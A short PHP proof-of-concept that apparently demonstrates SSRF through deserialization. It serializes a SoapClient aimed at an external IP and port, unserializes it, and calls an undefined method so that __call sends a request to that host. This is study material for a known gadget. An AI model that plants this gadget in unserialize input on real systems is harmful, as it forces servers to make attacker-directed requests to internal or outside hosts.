<?php
try {
    $s = new SoapClient(null,
        array(
            "location" => "http://1.94.226.40:23333/",
            "uri" => "demo"
        )
    );
} catch (SoapFault $e) {

}
var_dump($s);echo "\n";
echo "serialize: \n".serialize($s);

$exp = serialize($s);
$u = unserialize($exp);
$u->nonexists(); // execute SoapClient->__call()
